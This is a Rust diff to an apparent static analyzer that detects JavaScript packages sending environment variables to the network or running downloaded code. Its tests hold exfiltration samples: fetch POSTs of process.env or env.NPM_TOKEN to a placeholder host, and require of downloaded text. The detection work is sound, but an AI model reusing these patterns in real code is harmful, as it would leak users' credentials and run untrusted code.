@@ -382,6 +382,42 @@ pub(crate) fn bit_index(bit: u16) -> u8 {
     bit.trailing_zeros() as u8
 }
 
+/// Is a member's name an environment variable's, as programs name them: capitals, digits and underscores
+/// (`NODE_ENV`, `PRISMA_MANAGEMENT_API_URL`), npm's lower-case ones (`npm_config_registry`) and the proxies'
+/// (`http_proxy`)? Not a name objects give their members (`env`, `parsed`, `vars`).
+fn env_var_name(n: &[u32]) -> bool {
+    let up = |c: u32| ('A' as u32..='Z' as u32).contains(&c);
+    let digit = |c: u32| ('0' as u32..='9' as u32).contains(&c);
+    let upper = n.len() >= 2
+        && !digit(n[0])
+        && n.iter().any(|&c| up(c))
+        && n.iter().all(|&c| up(c) || digit(c) || c == '_' as u32);
+    upper || pystr::starts_with(n, "npm_") || is_one(n, &["http_proxy", "https_proxy", "no_proxy", "all_proxy"])
+}
+
+/// Does a member's name hold the environment (`env`, `environment`, `processEnv`)? (D-16)
+fn env_holder_name(n: &[u32]) -> bool {
+    pystr::contains(&pystr::lower(n), "env")
+}
+
+/// What a member of a name that is not the environment's holds of `obj` (D-16): its value without the whole
+/// environment, its parameters read through a member (MEMBER_KEY).
+pub(super) fn sc_through_member(obj: &V) -> V {
+    sc_without(&obj.plain(), K_WHOLE_ENV).through_member()
+}
+
+/// Built-in methods that give back what their object holds, or a part of it (an array's, a string's, a map's, a
+/// promise's, a response's, a form's): a call of one on a parameter gives what the parameter is given (D-16).
+const PASS_THROUGH: &[&str] = &[
+    "at", "concat", "copyWithin", "entries", "fill", "filter", "find", "findLast", "flat", "flatMap", "join", "keys",
+    "map", "pop", "reduce", "reduceRight", "reverse", "shift", "slice", "sort", "splice", "toReversed", "toSorted",
+    "toSpliced", "values", "with", "toString", "toLocaleString", "charAt", "normalize", "padEnd", "padStart", "repeat",
+    "replace", "replaceAll", "split", "substr", "substring", "toLowerCase", "toUpperCase", "toLocaleLowerCase",
+    "toLocaleUpperCase", "trim", "trimEnd", "trimStart", "trimLeft", "trimRight", "match", "matchAll", "valueOf",
+    "toJSON", "toWellFormed", "get", "getAll", "then", "catch", "finally", "json", "text", "arrayBuffer", "blob",
+    "subarray", "next", "toObject", "getBuffer", "getBody", "toBuffer", "serialize", "stringify", "encode", "read",
+];
+
 /// A value without one kind of source (its parameters kept): nothing when
 /// that was all it held.
 pub(crate) fn sc_without(v: &V, bit: u16) -> V {
@@ -2231,6 +2267,21 @@ impl<'p> Eval<'p> {
         }
     }
 
+    /// Does a call's first argument name a JSON file, its text ending in a literal that ends in `.json`
+    /// (`require('./data.json')`, `require(path.join(dir, 'package.json'))`)? require parses such a file and runs
+    /// none of it.
+    fn sc_json_module(&self, node: NodeId) -> bool {
+        let a = self.a();
+        let first = match a.list(node, jt::B).first() {
+            Some(&f) => f,
+            None => return false,
+        };
+        let nd = &a.0.nodes[first as usize];
+        let sup = self.sup();
+        let lower = pystr::lower(pystr::rstrip_chars(sup.span(nd.start, nd.end), ") \t\r\n"));
+        [".json'", ".json\"", ".json`"].iter().any(|e| pystr::ends_with(&lower, e))
+    }
+
     /// Is a call's callee a resolver of the platform's: `require.resolve` (of Node's `require`, not a name of the
     /// script's, or of one `createRequire()` made, as ES modules do), `import.meta.resolve`? The model's
     /// descriptions name no member of either.
@@ -2794,6 +2845,26 @@ impl<'p> Eval<'p> {
                 return Some(self.read(b));
             }
         }
+        // a copy of the environment, a value holding it or a parameter, read by a member's name (`{ ...process.env
+        // }`, `Object.assign({}, process.env)`, `{ env: process.env, path }`, a parameter whose default is
+        // process.env: the model keeps process.env's mark in none of them, and reads an object's members as the
+        // whole object): a variable's name is that variable, as process.env's own member is; a name that holds the
+        // environment (`env`, `environment`) is all of it; any other member is not the environment, and a
+        // parameter read so gives the function's return none of the environment a call gives it (MEMBER_KEY). With
+        // what else the value holds (D-16: prisma's `getApiBaseUrl(env = process.env)` reads
+        // `env.PRISMA_MANAGEMENT_API_URL`, its telemetry's `buildTelemetryEvent(payload, config, env)` reads
+        // `env.platform`; corepack's `localEnv.path` is a path)
+        let whole = obj.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0);
+        if !computed && (whole || !obj.params.is_empty()) {
+            if let Some(n) = name.as_deref().filter(|n| !eq(n, "length")) {
+                if env_var_name(n) {
+                    return Some(sc_through_member(obj).union(&self.sc_env_var(n, at, line)));
+                }
+                if !env_holder_name(n) {
+                    return Some(sc_through_member(obj));
+                }
+            }
+        }
         None
     }
 
@@ -2827,7 +2898,10 @@ impl<'p> Eval<'p> {
             let shell = names
                 .iter()
                 .any(|n| is_one(n, &["child_process.exec", "child_process.execSync", "shelljs.exec", "execSync", "exec"]));
-            if !(shell && self.sc_fixed_program(node, scope)) {
+            // (a JSON file's path given require: it is parsed, and runs nothing; corepack's
+            // `require(path.join(tmpFolder, 'package.json'))` of what it downloaded, D-18)
+            let json = r.cat == LOAD_NAME && self.sc_json_module(node);
+            if !(shell && self.sc_fixed_program(node, scope)) && !json {
                 self.sc_sink(r.cat, &v, at);
             }
         }
@@ -2960,12 +3034,16 @@ impl<'p> Eval<'p> {
         let (fids, how) = (tg.0.clone(), tg.1);
         let definite = how == descs::How::Definite;
         let line = self.call_line(node);
+        // (a method of its own, called on a parameter: that member of the parameter, D-16: prisma's
+        // `env.readProjectPackageJson()`; a built-in one gives back what the parameter holds)
+        let own = member && name.as_deref().is_some_and(|n| !is_one(n, PASS_THROUGH) && !env_holder_name(n));
+        let held = if own { recv.plain().through_member() } else { recv.plain() };
         let mut v;
         if !fids.is_empty() {
             v = self.apply(node, &fids, args, spread, line, false);
             if !definite {
                 let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-                v = v.union(&union_all(&plains)).union(&recv.plain());
+                v = v.union(&union_all(&plains)).union(&held);
             }
             // (an instance of a class made in several places is a container:
             // what its methods are given it holds, what it holds they give back)
@@ -2982,7 +3060,7 @@ impl<'p> Eval<'p> {
             v = V::empty();
         } else {
             let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
-            v = union_all(&plains).union(&recv.plain());
+            v = union_all(&plains).union(&held);
             if !member {
                 v = v.union(&callee_val.plain());
             } else if named("join") || named("concat") {
@@ -3435,6 +3513,76 @@ mod tests {
         );
         // a local object named process is not the environment
         assert_eq!(sent(&format!("const process = {{ env: {{ TOKEN: 'x' }} }};\nconst v = process.env.TOKEN;\n{}", post)), None);
+    }
+
+    #[test]
+    fn copies_and_holders_of_the_environment_read_by_name() {
+        // D-16: process.env held by a parameter's default, an object's property or a copy keeps no mark; a member
+        // read by a variable's name is that variable, one of another name is not the environment
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        // prisma's shape: a parameter whose default is process.env
+        let src = format!("function base(env = process.env) {{ return env.API_URL || 'https://api.invalid'; }}\n{}", post("base()"));
+        assert_eq!(sent(&src), None);
+        for (setup, read) in [
+            ("const env = { ...process.env };", "env.API_URL"),
+            ("const env = Object.assign({}, process.env);", "env.API_URL"),
+            // clipanion's context
+            ("const ctx = { env: process.env };", "ctx.env.API_URL"),
+            // corepack's: `{ env: <a copy>, path }`, its path read
+            ("const local = { env: { ...process.env }, path: '/p/.corepack.env' };", "local.path"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), None, "{}", setup);
+        }
+        // a secret variable read so is that variable
+        assert_eq!(sent(&format!("const env = {{ ...process.env }};\n{}", post("env.NPM_TOKEN"))), found("environment", "NPM_TOKEN"));
+        // a parameter read by members: what a call gives it is not the whole environment there (prisma's telemetry:
+        // `buildTelemetryEvent(payload, config, env)` reads `env.platform`, `env.env.npm_config_user_agent` and calls
+        // `env.readProjectPackageJson()`), in what it returns and at a send it reaches, and through a function that
+        // hands the parameter on
+        for (setup, read) in [
+            ("function u(env) { return 'https://' + env.API_HOST; }", "u(process.env)"),
+            (
+                "function ev(p, e) { return { os: e.platform, pm: e.env.npm_config_user_agent, ts: e.readPkg() }; }",
+                "JSON.stringify(ev({}, { platform: process.platform, env: process.env, readPkg: () => null }))",
+            ),
+            ("function base(env) { return env.API_URL || 'https://api.invalid'; }\nfunction get(e) { return base(e) + '/x'; }", "get(process.env)"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), None, "{}", setup);
+        }
+        let src = format!("function rep(c) {{ {} }}\nrep({{ platform: 'x', env: process.env }});\n", post("c.platform"));
+        assert_eq!(sent(&src), None);
+        // the copy or the holder sent whole, or the holder's environment, is still the whole environment, through a
+        // parameter too: returned whole, beside a member, as its `env`, or sent whole where it is the parameter
+        for (setup, read) in [
+            ("const env = { ...process.env };", "JSON.stringify(env)"),
+            ("const ctx = { env: process.env, n: 1 };", "JSON.stringify(ctx)"),
+            ("const ctx = { env: process.env };", "JSON.stringify(ctx.env)"),
+            ("function f(env = process.env) { return env; }", "JSON.stringify(f())"),
+            ("function g(c) { return c.env; }", "JSON.stringify(g({ env: process.env }))"),
+            ("function m(e) { return { p: e.platform, all: e }; }", "JSON.stringify(m(process.env))"),
+            ("function fmt(l) { return l.join('\\n'); }", "fmt(Object.entries(process.env).map(([k, v]) => k + '=' + v))"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), found("environment", "the whole environment"), "{}", setup);
+        }
+        let src = format!("function send(e) {{ {} }}\nsend(process.env);\n", post("JSON.stringify(e)"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+    }
+
+    #[test]
+    fn a_json_file_given_require_is_parsed() {
+        // D-18: corepack requires the package.json of the package manager it downloaded; require parses JSON and
+        // runs none of it
+        let dl = |end: &str| {
+            format!(
+                "const https = require('https');\nhttps.get('https://{}/m', (res) => {{ let d = ''; \
+                 res.on('data', (c) => d += c); res.on('end', () => {{ {} }}); }});\n",
+                HOST, end
+            )
+        };
+        assert_eq!(runs(&dl("require(d);")), Some("import"));
+        assert_eq!(runs(&dl("require('./m/' + d + '.js');")), Some("import"));
+        assert_eq!(runs(&dl("require('./m/' + d + '.json');")), None);
+        assert_eq!(runs(&dl("require(require('path').join('/tmp', d, 'package.json'));")), None);
     }
 
     #[test]
